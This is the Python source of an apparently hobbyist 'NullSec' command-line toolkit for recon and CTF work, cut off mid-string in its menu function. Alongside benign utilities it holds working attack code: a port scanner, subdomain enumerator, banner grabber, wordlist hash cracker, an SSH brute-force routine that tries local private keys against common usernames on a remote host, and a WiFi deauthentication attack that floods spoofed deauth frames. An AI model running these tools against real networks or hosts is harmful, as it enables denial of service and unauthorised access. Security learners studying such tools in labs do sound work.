from colorama import Fore, Style, init

CYAN = Fore.CYAN
from rich.console import Console
from rich.align import Align
from rich.text import Text
from rich.panel import Panel

console = Console()
import os, sys, socket, base64, hashlib, subprocess, platform, urllib.request, urllib.parse, json, time, string
import readline

try:
    import paramiko

    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
try:
    from scapy.all import RadioTap, Dot11, Dot11AuthReq, Dot11Deauth, sendp, conf

    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
RESET = Style.RESET_ALL
BRIGHT = Style.BRIGHT

version = "V2.1"
current_dir = os.getcwd()
username_pc = os.getlogin()
show_plugins = False

if sys.platform.startswith("win"):
    os_name = "Windows"
elif sys.platform.startswith("linux"):
    os_name = "Linux"
else:
    os_name = "Unknown"

# ─── Theme system ──────────────────────────────────────────────────────────────

THEMES = {
    "red": {
        "primary": Fore.RED,
        "accent": Fore.YELLOW,
        "rich": "bold red",
        "ansi": "\033[1;31m",
    },
    "green": {
        "primary": Fore.GREEN,
        "accent": Fore.CYAN,
        "rich": "bold green",
        "ansi": "\033[1;32m",
    },
    "cyan": {
        "primary": Fore.CYAN,
        "accent": Fore.GREEN,
        "rich": "bold cyan",
        "ansi": "\033[1;36m",
    },
    "blue": {
        "primary": Fore.BLUE,
        "accent": Fore.CYAN,
        "rich": "bold blue",
        "ansi": "\033[1;34m",
    },
    "yellow": {
        "primary": Fore.YELLOW,
        "accent": Fore.RED,
        "rich": "bold yellow",
        "ansi": "\033[1;33m",
    },
    "purple": {
        "primary": Fore.MAGENTA,
        "accent": Fore.CYAN,
        "rich": "bold magenta",
        "ansi": "\033[1;35m",
    },
}
THEME_FILE = ".nullsec_theme"


def load_theme():
    try:
        with open(THEME_FILE) as f:
            name = f.read().strip()
        if name in THEMES:
            return name, THEMES[name]
    except FileNotFoundError:
        pass
    return "red", THEMES["red"]


def apply_theme(name):
    t = THEMES[name]
    globals()["RED"] = t["primary"]
    globals()["YELLOW"] = t["accent"]
    globals()["RICH_STYLE"] = t["rich"]
    globals()["ANSI_STYLE"] = t["ansi"]
    with open(THEME_FILE, "w") as f:
        f.write(name)


current_theme, _t = load_theme()
RED = _t["primary"]
YELLOW = _t["accent"]
RICH_STYLE = _t["rich"]
ANSI_STYLE = _t["ansi"]

# ─── Changelog ─────────────────────────────────────────────────────────────────

CHANGELOG = [
    (
        "V2.1",
        [
            "SSH key brute-force tool (sshbrute)",
            "WiFi deauth attack tool (wifideauth)",
            "Plugin system with auto-detection",
            "Plugins folder: nullsec/plugins/",
            "Plugin panel toggle (plugtoggle)"
        ],
    ),
    (
        "V2.0",
        [
            "Rework + Split",
            "Core navigation commands (cd, ls, pwd, open)",
            "Network tools: ping, myip, dns, whois, portscan",
            "Encoding: b64, hex, url, rot/caesar",
            "Crypto: hashcrack, jwt decoder",
            "Analysis: sysinfo, fcheck, passcheck, strings, hexdump",
            "HTTP tools: headers, subdomains, geoip, bannergrab",
            "Typewriter banner effect",
            "Theme switcher",
            "Tab completion",
        ],
    ),
]

# ─── Handlers ─────────────────────────────────────────────────────────────────


def handle_help(args):
    help_text = Text.from_ansi(f"""
[{RED}Developer{RESET}]  sxlar/ez
[{RED}Version{RESET}]    {version}

[{RED}Navigation{RESET}]
  cd <path>              Change directory
  ls / dir               List directory contents
  pwd                    Print working directory
  open <file>            Print file contents
  clear                  Clear the screen
  echo <text>            Echo text
  e / exit               Exit NullSec

[{RED}Network{RESET}]
  ping <host>            Ping a host
  myip                   Show your public IP
  dns <domain>           DNS lookup
  whois <domain>         Domain info
  portscan <host> [range] Scan ports  e.g. portscan localhost 1-1024
  headers <url>          Grab HTTP headers
  subdomains <domain>    Enumerate subdomains
  geoip <ip|domain>      Geolocate an IP or domain
  bannergrab <host> <port> Grab service banner from a port
  sshbrute <host> <port> <wordlist>  SSH key brute-force
  wifideauth <target> <bssid> [iface] WiFi deauth attack

[{RED}System{RESET}]
  sysinfo                OS, CPU, RAM, IP, hostname
  fcheck <dir>           File integrity snapshot / check

[{RED}Encoding & Crypto{RESET}]
  encode b64 <text>      Base64 encode
  decode b64 <text>      Base64 decode
  encode hex <text>      Hex encode
  decode hex <text>      Hex decode
  url encode <text>      URL encode
  url decode <text>      URL decode
  rot <n> <text>         Caesar / ROT13 cipher  (rot 13 hello)
  hashcrack <hash> <wordlist>  Crack a hash against a wordlist
  jwt <token>            Decode a JWT (no signature check)

[{RED}Analysis{RESET}]
  passcheck <password>   Check password strength
  strings <file> [min]   Extract printable strings from a file
  hexdump <file> [bytes] Hex dump a file

[{RED}Other{RESET}]
  plugtoggle             Toggle plugins panel on/off
  help                   Show this menu
""")
    console.print(Panel.fit(help_text, border_style=RICH_STYLE, title="NullSec Help"))


# ── Navigation ────────────────────────────────────────────────────────────────


def handle_ls(args):
    path = args[0] if args else "."
    try:
        for item in os.listdir(path):
            print(item)
    except FileNotFoundError:
        print(f"[{RED}!{RESET}] Directory not found")


def handle_open(args):
    if not args:
        print(f"[{RED}Usage{RESET}] open <file>")
        return
    try:
        with open(args[0], "r") as f:
            print(f.read())
    except FileNotFoundError:
        print(f"[{RED}!{RESET}] File not found: {args[0]}")
    except PermissionError:
        print(f"[{RED}!{RESET}] Permission denied: {args[0]}")
    except UnicodeDecodeError:
        print(f"[{RED}!{RESET}] Cannot read binary file: {args[0]}")


def handle_cd(args):
    global current_dir
    if not args:
        print(f"[{RED}Usage{RESET}] cd <path>")
        return
    new_path = os.path.abspath(os.path.join(current_dir, args[0]))
    if os.path.isdir(new_path):
        current_dir = new_path
        os.chdir(new_path)
    else:
        print(f"No such directory: {args[0]}")


def handle_pwd(args):
    print(current_dir)


def handle_clear(args):
    clear()
    show_banner()


def handle_exit(args):
    clear()
    sys.exit()


def handle_echo(args):
    print(" ".join(args))


# ── Network ───────────────────────────────────────────────────────────────────


def handle_ping(args):
    if not args:
        print(f"[{RED}Usage{RESET}] ping <host>")
        return
    host = args[0]
    count = args[1] if len(args) > 1 else "4"
    print(f"[{GREEN}>{RESET}] Pinging {host}...")
    try:
        flag = "-n" if os.name == "nt" else "-c"
        result = subprocess.run(
            ["ping", flag, count, host], capture_output=True, text=True, timeout=15
        )
        print(result.stdout)
        if result.returncode != 0:
            print(f"[{RED}!{RESET}] Host unreachable or not found")
    except subprocess.TimeoutExpired:
        print(f"[{RED}!{RESET}] Ping timed out")
    except FileNotFoundError:
        print(f"[{RED}!{RESET}] ping not available on this system")


def handle_myip(args):
    print(f"[{GREEN}>{RESET}] Fetching public IP...")
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=5) as r:
            print(f"[{GREEN}>{RESET}] Public IP: {r.read().decode()}")
    except Exception as e:
        print(f"[{RED}!{RESET}] Could not fetch public IP: {e}")


def handle_dns(args):
    if not args:
        print(f"[{RED}Usage{RESET}] dns <domain>")
        return
    domain = args[0]
    try:
        results = socket.getaddrinfo(domain, None)
        ips = sorted(set(r[4][0] for r in results))
        print(f"[{GREEN}>{RESET}] {domain}")
        for ip in ips:
            print(f"    {ip}")
    except socket.gaierror as e:
        print(f"[{RED}!{RESET}] DNS lookup failed: {e}")


def handle_whois(args):
    if not args:
        print(f"[{RED}Usage{RESET}] whois <domain>")
        return
    domain = args[0]
    try:
        result = subprocess.run(
            ["whois", domain], capture_output=True, text=True, timeout=10
        )
        keywords = [
            "domain",
            "registrar",
            "creation",
            "expir",
            "updated",
            "name server",
            "registrant",
            "country",
            "status",
            "organisation",
        ]
        useful = [
            f"  {l.strip()}"
            for l in result.stdout.splitlines()
            if any(k in l.lower() for k in keywords) and ":" in l
        ]
        if useful:
            print(f"\n[{GREEN}>{RESET}] whois {domain}\n")
            print("\n".join(useful[:30]))
        else:
            print(result.stdout[:1500])
    except FileNotFoundError:
        print(f"[{RED}!{RESET}] whois not installed — sudo apt install whois")
    except subprocess.TimeoutExpired:
        print(f"[{RED}!{RESET}] whois timed out")


def handle_portscan(args):
    if not args:
        print(f"[{RED}Usage{RESET}] portscan <host> [startport-endport]")
        return
    host = args[0]
    port_range = args[1] if len(args) > 1 else "1-1024"
    try:
        start, end = map(int, port_range.split("-"))
    except ValueError:
        print(f"[{RED}!{RESET}] Invalid range — use format: 1-1024")
        return
    if end - start > 10000:
        print(f"[{RED}!{RESET}] Range too large (max 10000 ports per scan)")
        return
    print(f"[{GREEN}>{RESET}] Scanning {host} ports {start}-{end}...")
    open_ports = []
    try:
        for p in range(start, end + 1):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            if s.connect_ex((host, p)) == 0:
                try:
                    service = socket.getservbyport(p)
                except OSError:
                    service = "unknown"
                open_ports.append((p, service))
                print(f"  [{GREEN}OPEN{RESET}] {p:<6} {service}")
            s.close()
    except KeyboardInterrupt:
        print(f"\n[{RED}!{RESET}] Scan interrupted")
    if not open_ports:
        print(f"[{RED}!{RESET}] No open ports found in range {start}-{end}")
    else:
        print(f"\n[{GREEN}>{RESET}] Found {len(open_ports)} open port(s)")


def handle_headers(args):
    if not args:
        print(f"[{RED}Usage{RESET}] headers <url>")
        return
    url = args[0]
    if not url.startswith("http"):
        url = "http://" + url
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "NullSec"})
        with urllib.request.urlopen(req, timeout=8) as r:
            print(f"\n[{GREEN}>{RESET}] HTTP {r.status} — {url}\n")
            for k, v in r.headers.items():
                print(f"  [{RED}{k}{RESET}] {v}")
    except Exception as e:
        print(f"[{RED}!{RESET}] Error: {e}")


def handle_subdomains(args):
    if not args:
        print(f"[{RED}Usage{RESET}] subdomains <domain>")
        return
    domain = args[0]
    # common subdomain wordlist — enough to be useful for learning
    wordlist = [
        "www",
        "mail",
        "ftp",
        "smtp",
        "pop",
        "imap",
        "vpn",
        "remote",
        "dev",
        "staging",
        "test",
        "api",
        "admin",
        "portal",
        "app",
        "blog",
        "shop",
        "cdn",
        "static",
        "assets",
        "media",
        "img",
        "ns1",
        "ns2",
        "dns",
        "mx",
        "webmail",
        "secure",
        "login",
        "dashboard",
        "m",
        "mobile",
        "beta",
        "old",
        "new",
        "status",
    ]
    print(
        f"[{GREEN}>{RESET}] Enumerating subdomains for {domain} ({len(wordlist)} candidates)...\n"
    )
    found = []
    try:
        for sub in wordlist:
            fqdn = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(fqdn)
                print(f"  [{GREEN}FOUND{RESET}] {fqdn:<40} {ip}")
                found.append(fqdn)
            except socket.gaierror:
                pass
    except KeyboardInterrupt:
        print(f"\n[{RED}!{RESET}] Interrupted")
    print(f"\n[{GREEN}>{RESET}] Found {len(found)} subdomain(s)")


# ── System ────────────────────────────────────────────────────────────────────


def handle_sysinfo(args):
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        os_info = platform.platform()
        cpu = platform.processor() or platform.machine()
        arch = platform.architecture()[0]
        try:
            import psutil

            ram_total = f"{psutil.virtual_memory().total / (1024**3):.1f} GB"
            ram_used = f"{psutil.virtual_memory().percent}% used"
        except ImportError:
            ram_total = "install psutil for RAM info"
            ram_used = ""

        info = Text.from_ansi(f"""
  [{RED}Hostname{RESET}]   {hostname}
  [{RED}Local IP{RESET}]   {local_ip}
  [{RED}OS{RESET}]         {os_info}
  [{RED}CPU{RESET}]        {cpu} ({arch})
  [{RED}RAM{RESET}]        {ram_total}  {ram_used}
  [{RED}Python{RESET}]     {platform.python_version()}
""")
        console.print(Panel.fit(info, border_style=RICH_STYLE, title="System Info"))
    except Exception as e:
        print(f"[{RED}!{RESET}] sysinfo error: {e}")


def handle_fcheck(args):
    if not args:
        print(f"[{RED}Usage{RESET}] fcheck <directory>")
        print(f"         First run: takes a snapshot")
        print(f"         Second run: compares against snapshot")
        return
    target = os.path.abspath(args[0])
    snapfile = f".fcheck_{target.replace(os.sep, '_').strip('_')}.json"

    def snapshot(path):
        result = {}
        for root, _, files in os.walk(path):
            for fname in files:
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "rb") as f:
                        h = hashlib.sha256(f.read()).hexdigest()
                    result[fpath] = h
                except (PermissionError, OSError):
                    pass
        return result

    if not os.path.exists(snapfile):
        print(f"[{GREEN}>{RESET}] Taking snapshot of {target}...")
        snap = snapshot(target)
        with open(snapfile, "w") as f:
            json.dump(snap, f, indent=2)
        print(f"[{GREEN}+{RESET}] Snapshot saved — {len(snap)} files hashed")
        print(f"         Run fcheck again to compare")
    else:
        print(f"[{GREEN}>{RESET}] Comparing against snapshot...")
        with open(snapfile) as f:
            old = json.load(f)
        new = snapshot(target)

        added = [k for k in new if k not in old]
        removed = [k for k in old if k not in new]
        changed = [k for k in new if k in old and new[k] != old[k]]

        if not any([added, removed, changed]):
            print(f"[{GREEN}+{RESET}] No changes detected")
        if added:
            print(f"\n[{GREEN}+{RESET}] New files ({len(added)}):")
            for f in added:
                print(f"    {f}")
        if removed:
            print(f"\n[{RED}!{RESET}] Removed files ({len(removed)}):")
            for f in removed:
                print(f"    {f}")
        if changed:
            print(f"\n[{YELLOW}~{RESET}] Modified files ({len(changed)}):")
            for f in changed:
                print(f"    {f}")

        choice = input(f"\n[{RED}>{RESET}] Update snapshot? (y/n) ").strip().lower()
        if choice == "y":
            with open(snapfile, "w") as f:
                json.dump(new, f, indent=2)
            print(f"[{GREEN}+{RESET}] Snapshot updated")


# ── Encoding & Crypto ─────────────────────────────────────────────────────────


def handle_encode(args):
    if len(args) < 2:
        print(f"[{RED}Usage{RESET}] encode <b64|hex> <text>")
        return
    mode = args[0].lower()
    text = " ".join(args[1:])
    try:
        if mode == "b64":
            print(f"[{GREEN}>{RESET}] {base64.b64encode(text.encode()).decode()}")
        elif mode == "hex":
            print(f"[{GREEN}>{RESET}] {text.encode().hex()}")
        else:
            print(f"[{RED}!{RESET}] Unknown mode (use b64 or hex)")
    except Exception as e:
        print(f"[{RED}!{RESET}] Encode error: {e}")


def handle_decode(args):
    if len(args) < 2:
        print(f"[{RED}Usage{RESET}] decode <b64|hex> <text>")
        return
    mode = args[0].lower()
    text = " ".join(args[1:])
    try:
        if mode == "b64":
            print(f"[{GREEN}>{RESET}] {base64.b64decode(text.encode()).decode()}")
        elif mode == "hex":
            print(f"[{GREEN}>{RESET}] {bytes.fromhex(text).decode()}")
        else:
            print(f"[{RED}!{RESET}] Unknown mode (use b64 or hex)")
    except Exception as e:
        print(f"[{RED}!{RESET}] Decode error: {e}")


def handle_rot(args):
    if len(args) < 2:
        print(f"[{RED}Usage{RESET}] rot <shift> <text>   (rot 13 hello)")
        return
    try:
        shift = int(args[0]) % 26
    except ValueError:
        print(f"[{RED}!{RESET}] Shift must be a number")
        return
    text = " ".join(args[1:])
    result = []
    for ch in text:
        if ch.isalpha():
            base = ord("A") if ch.isupper() else ord("a")
            result.append(chr((ord(ch) - base + shift) % 26 + base))
        else:
            result.append(ch)
    print(f"[{GREEN}>{RESET}] {''.join(result)}")


def handle_hashcrack(args):
    if len(args) < 2:
        print(f"[{RED}Usage{RESET}] hashcrack <hash> <wordlist_file>")
        return
    target = args[0].lower()
    wordlist = args[1]

    # auto-detect hash type by length
    ALGOS = {
        32: "md5",
        40: "sha1",
        56: "sha224",
        64: "sha256",
        96: "sha384",
        128: "sha512",
    }
    algo = ALGOS.get(len(target))
    if not algo:
        print(f"[{RED}!{RESET}] Unrecognised hash length ({len(target)} chars)")
        return

    if not os.path.exists(wordlist):
        print(f"[{RED}!{RESET}] Wordlist not found: {wordlist}")
        return

    print(f"[{GREEN}>{RESET}] Cracking {algo.upper()} hash against {wordlist}...")
    try:
        with open(wordlist, "r", errors="ignore") as f:
            for i, line in enumerate(f):
                word = line.rstrip("\n")
                guess = hashlib.new(algo, word.encode()).hexdigest()
                if guess == target:
                    print(f"[{GREEN}+{RESET}] CRACKED after {i + 1} attempts: {word}")
                    return
                if i % 10000 == 0 and i > 0:
                    print(f"  [{YELLOW}~{RESET}] {i} tried...", end="\r")
        print(f"[{RED}!{RESET}] Hash not found in wordlist")
    except KeyboardInterrupt:
        print(f"\n[{RED}!{RESET}] Interrupted")


def handle_jwt(args):
    if not args:
        print(f"[{RED}Usage{RESET}] jwt <token>")
        return
    token = args[0]
    parts = token.split(".")
    if len(parts) != 3:
        print(f"[{RED}!{RESET}] Not a valid JWT (expected 3 parts)")
        return
    try:

        def decode_part(p):
            # add padding if needed
            p += "=" * (4 - len(p) % 4)
            return json.loads(base64.urlsafe_b64decode(p).decode())

        header = decode_part(parts[0])
        payload = decode_part(parts[1])

        info = Text.from_ansi(f"""
[{RED}Header{RESET}]
{json.dumps(header, indent=2)}

[{RED}Payload{RESET}]
{json.dumps(payload, indent=2)}

[{RED}Signature{RESET}]  {parts[2][:32]}...  (not verified)
""")
        console.print(Panel.fit(info, border_style=RICH_STYLE, title="JWT Decoded"))
    except Exception as e:
        print(f"[{RED}!{RESET}] JWT decode error: {e}")


def handle_geoip(args):
    if not args:
        print(f"[{RED}Usage{RESET}] geoip <ip|domain>")
        return
    target = args[0]
    # resolve domain to IP first if needed
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"[{RED}!{RESET}] Could not resolve: {target}")
        return
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,lat,lon,query"
        with urllib.request.urlopen(url, timeout=6) as r:
            data = json.loads(r.read().decode())
        if data.get("status") != "success":
            print(f"[{RED}!{RESET}] Lookup failed for {ip}")
            return
        info = Text.from_ansi(f"""
  [{RED}IP{RESET}]         {data.get("query")}
  [{RED}Country{RESET}]    {data.get("country")}
  [{RED}Region{RESET}]     {data.get("regionName")}
  [{RED}City{RESET}]       {data.get("city")}
  [{RED}ISP{RESET}]        {data.get("isp")}
  [{RED}Org{RESET}]        {data.get("org")}
  [{RED}Lat/Lon{RESET}]    {data.get("lat")}, {data.get("lon")}
""")
        console.print(Panel.fit(info, border_style=RICH_STYLE, title=f"GeoIP — {ip}"))
    except Exception as e:
        print(f"[{RED}!{RESET}] GeoIP error: {e}")


def handle_urlencode(args):
    if len(args) < 2:
        print(f"[{RED}Usage{RESET}] url encode <text>  |  url decode <text>")
        return
    mode = args[0].lower()
    text = " ".join(args[1:])
    if mode == "encode":
        print(f"[{GREEN}>{RESET}] {urllib.parse.quote(text)}")
    elif mode == "decode":
        print(f"[{GREEN}>{RESET}] {urllib.parse.unquote(text)}")
    else:
        print(f"[{RED}!{RESET}] Unknown mode (use encode or decode)")


def handle_passcheck(args):
    if not args:
        print(f"[{RED}Usage{RESET}] passcheck <password>")
        return
    pw = " ".join(args)
    score = 0
    issues = []
    tips = []

    if len(pw) >= 8:
        score += 1
    else:
        issues.append("Too short (min 8 chars)")

    if len(pw) >= 12:
        score += 1
    else:
        tips.append("12+ chars is better")

    if len(pw) >= 16:
        score += 1

    if any(c.isupper() for c in pw):
        score += 1
    else:
        issues.append("No uppercase letters")

    if any(c.islower() for c in pw):
        score += 1
    else:
        issues.append("No lowercase letters")

    if any(c.isdigit() for c in pw):
        score += 1
    else:
        issues.append("No numbers")

    special = set(string.punctuation)
    if any(c in special for c in pw):
        score += 1
    else:
        issues.append("No special characters (!@#$ etc)")

    common = ["password", "123456", "qwerty", "letmein", "admin", "welcome", "monkey"]
    if pw.lower() in common:
        score = 0
        issues.append("This is one of the most common passwords!")

    ratings = {
        range(0, 3): (f"[{RED}VERY WEAK{RESET}]", RED),
        range(3, 5): (f"[{RED}WEAK{RESET}]", RED),
        range(5, 6): (f"[{YELLOW}MODERATE{RESET}]", YELLOW),
        range(6, 7): (f"[{GREEN}STRONG{RESET}]", GREEN),
        range(7, 8): (f"[{GREEN}VERY STRONG{RESET}]", GREEN),
    }
    label = next(v[0] for k, v in ratings.items() if score in k)

    print(f"\n  Password : {'*' * len(pw)}  ({len(pw)} chars)")
    print(f"  Score    : {score}/7  {label}")
    if issues:
        print(f"\n  [{RED}Issues{RESET}]")
        for i in issues:
            print(f"    • {i}")
    if tips:
        print(f"\n  [{YELLOW}Tips{RESET}]")
        for t in tips:
            print(f"    • {t}")
    print()


def handle_bannergrab(args):
    if not args:
        print(f"[{RED}Usage{RESET}] bannergrab <host> <port>")
        print(f"         e.g. bannergrab scanme.nmap.org 80")
        return
    host = args[0]
    try:
        port = int(args[1]) if len(args) > 1 else 80
    except ValueError:
        print(f"[{RED}!{RESET}] Port must be a number")
        return
    print(f"[{GREEN}>{RESET}] Grabbing banner from {host}:{port}...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        # send a generic HTTP request — works for HTTP, sometimes others respond anyway
        if port in (80, 8080, 8000, 443):
            s.send(b"HEAD / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        else:
            s.send(b"\r\n")
        banner = s.recv(1024).decode(errors="replace").strip()
        s.close()
        print(f"\n[{GREEN}+{RESET}] Banner received:\n")
        for line in banner.splitlines():
            print(f"  {line}")
    except socket.timeout:
        print(f"[{RED}!{RESET}] Connection timed out")
    except ConnectionRefusedError:
        print(f"[{RED}!{RESET}] Connection refused — port may be closed")
    except Exception as e:
        print(f"[{RED}!{RESET}] Error: {e}")


def handle_strings(args):
    if not args:
        print(f"[{RED}Usage{RESET}] strings <file> [minlength]")
        print(f"         e.g. strings binary.exe 6")
        return
    filepath = args[0]
    min_len = int(args[1]) if len(args) > 1 and args[1].isdigit() else 4
    printable = set(string.printable) - set("\t\n\r\x0b\x0c")
    if not os.path.exists(filepath):
        print(f"[{RED}!{RESET}] File not found: {filepath}")
        return
    print(
        f"[{GREEN}>{RESET}] Extracting strings (min length {min_len}) from {filepath}...\n"
    )
    found = 0
    try:
        with open(filepath, "rb") as f:
            current = []
            while True:
                byte = f.read(1)
                if not byte:
                    break
                ch = chr(byte[0])
                if ch in printable:
                    current.append(ch)
                else:
                    if len(current) >= min_len:
                        print("".join(current))
                        found += 1
                    current = []
        print(f"\n[{GREEN}+{RESET}] Found {found} string(s)")
    except PermissionError:
        print(f"[{RED}!{RESET}] Permission denied: {filepath}")
    except KeyboardInterrupt:
        print(f"\n[{RED}!{RESET}] Interrupted — {found} strings shown")


def handle_hexdump(args):
    if not args:
        print(f"[{RED}Usage{RESET}] hexdump <file> [bytes]")
        print(f"         e.g. hexdump file.bin 256")
        return
    filepath = args[0]
    limit = int(args[1]) if len(args) > 1 and args[1].isdigit() else 256
    if not os.path.exists(filepath):
        print(f"[{RED}!{RESET}] File not found: {filepath}")
        return
    try:
        with open(filepath, "rb") as f:
            data = f.read(limit)
        print(f"\n[{GREEN}+{RESET}] Hex dump of {filepath} (first {len(data)} bytes)\n")
        print(f"  {'Offset':<10} {'Hex':<48} {'ASCII'}")
        print(f"  {'-' * 10} {'-' * 47} {'-' * 16}")
        for i in range(0, len(data), 16):
            chunk = data[i : i + 16]
            hex_str = " ".join(f"{b:02x}" for b in chunk)
            asc_str = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
            print(f"  {i:08x}   {hex_str:<47}  {asc_str}")
        print()
    except PermissionError:
        print(f"[{RED}!{RESET}] Permission denied: {filepath}")


def handle_sshbrute(args):
    if not HAS_PARAMIKO:
        print(f"[{RED}!{RESET}] paramiko not installed — pip install paramiko")
        return
    if len(args) < 3:
        print(f"[{RED}Usage{RESET}] sshbrute <host> <port> <wordlist>")
        print(f"         Tries SSH key authentication against target")
        return
    host = args[0]
    try:
        port = int(args[1])
    except ValueError:
        print(f"[{RED}!{RESET}] Port must be a number")
        return
    wordlist = args[2]
    if not os.path.exists(wordlist):
        print(f"[{RED}!{RESET}] Wordlist not found: {wordlist}")
        return

    key_paths = [
        os.path.expanduser("~/.ssh/id_rsa"),
        os.path.expanduser("~/.ssh/id_ed25519"),
        os.path.expanduser("~/.ssh/id_ecdsa"),
        os.path.expanduser("~/.ssh/id_dsa"),
    ]
    available_keys = [k for k in key_paths if os.path.exists(k)]

    print(f"[{GREEN}>{RESET}] SSH key brute-force on {host}:{port}")
    print(f"         Using {len(available_keys)} available keys from ~/.ssh/")
    print(f"         Also trying common usernames...\n")

    usernames = ["root", "admin", "user", "ubuntu", "ec2-user", "pi", "guest"]
    found = False

    for key_path in available_keys:
        try:
            key = paramiko.RSAKey.from_private_key_file(key_path)
        except paramiko.ssh_exception.PasswordLockedException:
            print(f"  [{YELLOW}~{RESET}] Skipping encrypted key: {key_path}")
            continue
        except Exception:
            continue

        for user in usernames:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, port=port, username=user, pkey=key, timeout=5)
                print(f"[{GREEN}+{RESET}] SUCCESS! Connected as {user} with {key_path}")
                print(f"         Key file: {key_path}")
                found = True
                ssh.close()
                if found:
                    return
            except paramiko.ssh_exception.AuthenticationException:
                pass
            except paramiko.ssh_exception.NoValidConnectionsError:
                print(f"[{RED}!{RESET}] Cannot connect to {host}:{port}")
                return
            except socket.timeout:
                print(f"[{RED}!{RESET}] Connection timeout")
                return
            except Exception as e:
                pass

    if not found:
        print(f"[{RED}!{RESET}] No valid SSH key found")


def handle_wifideauth(args):
    if not HAS_SCAPY:
        print(f"[{RED}!{RESET}] scapy not installed — pip install scapy")
        return
    if len(args) < 2:
        print(f"[{RED}Usage{RESET}] wifideauth <target_mac> <bssid> [iface]")
        print(f"         Send deauth packets to disconnect target from WiFi")
        print(f"         Example: wifideauth AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 wlan0")
        return
    target_mac = args[0].upper()
    bssid = args[1].upper()
    iface = args[2] if len(args) > 2 else conf.iface

    try:
        if len(target_mac.replace(":", "")) != 12 or len(bssid.replace(":", "")) != 12:
            print(f"[{RED}!{RESET}] Invalid MAC address format (AA:BB:CC:DD:EE:FF)")
            return
    except:
        print(f"[{RED}!{RESET}] Invalid MAC address format")
        return

    print(f"[{GREEN}>{RESET}] Starting deauth attack...")
    print(f"         Target : {target_mac}")
    print(f"         Router : {bssid}")
    print(f"         Interface : {iface}")
    print(f"         [{RED}Press Ctrl+C to stop{RESET}]")

    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
    frame = RadioTap() / dot11 / Dot11Deauth(reason=7)

    try:
        print(f"\n[{GREEN}>{RESET}] Sending deauth packets... (Ctrl+C to stop)")
        sendp(frame, iface=iface, loop=1, inter=0.1, verbose=1)
    except KeyboardInterrupt:
        print(f"\n[{RED}!{RESET}] Deauth attack stopped")
    except OSError as e:
        print(f"[{RED}!{RESET}] Interface error: {e}")
        print(f"         Make sure {iface} is in monitor mode:")
        print(f"         sudo airmon-ng start {iface}")


# ── Core ──────────────────────────────────────────────────────────────────────


def handle_theme(args):
    global current_theme, RED, YELLOW, RICH_STYLE, ANSI_STYLE
    if not args:
        print(f"\n  Current theme: {current_theme}")
        print(f"  Available:     {', '.join(THEMES.keys())}\n")
        return
    name = args[0].lower()
    if name not in THEMES:
        print(f"[{RED}!{RESET}] Unknown theme. Choose from: {', '.join(THEMES.keys())}")
        return
    current_theme = name
    apply_theme(name)
    print(f"[{GREEN}+{RESET}] Theme set to: {name}")


def handle_changelog(args):
    text = Text.from_ansi(f"\n[{RED}Version History{RESET}]\n")
    for ver, changes in reversed(CHANGELOG):
        text.append(f"\n  {ver}\n", style="bold")
        for c in changes:
            text.append(f"    • {c}\n")
    console.print(Panel.fit(text, border_style=RICH_STYLE, title="Changelog"))


def handle_back(args):
    clear()
    raise SystemExit("__back__")


def clear():
    os.system("clear" if os.name != "nt" else "cls")


def sutils():
    sys.stdout.write(f"\x1b]2;NullSec {version}\x07")


def slow_print(text, delay=0.045):
    reset = "\033[0m"
    width = os.get_terminal_size().columns
    for line in text.splitlines():
        pad = max(0, (width - len(line)) // 2)
        sys.stdout.write(" " * pad + ANSI_STYLE + line + reset + "\n")
        sys.stdout.flush()
        time.sleep(delay)


def banner():
    logo = r"""
     ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
     ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
    ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
    ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
    ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
    ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░▓  ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
    ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░ ▒  ░░ ░ ▒  ░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
       ░   ░ ░  ░░░ ░ ░   ░ ░     ░ ░   ░  ░  ░     ░   ░        
             ░    ░         ░  ░    ░  ░      ░     ░  ░░ ░      
    """
    links = Text.from_ansi(
        f"[{RED}GITHUB{RESET}] https://github.com/sxlar333/nullsec  "
        f"[{RED}DISCORD{RESET}] https://discord.gg/dwte3mus4W"
    )
    console.print(
        Align.center(Panel.fit(links, border_style=RICH_STYLE, title="Links"))
    )
    slow_print(logo)
    info = Text.from_ansi(
        f"NullSec [{RED}{version}{RESET}]  [{RED}INFO{RESET}] Recon/Network & CTF Toolkit"
    )
    console.print(Align.center(Panel.fit(info, border_style=RICH_STYLE)))

def menu():
    from plugins import load_plugins, get_plugin_commands

    global show_plugins

    load_plugins()
    plugins = get_plugin_commands()

    menu_options = Text.from_ansi(f"""
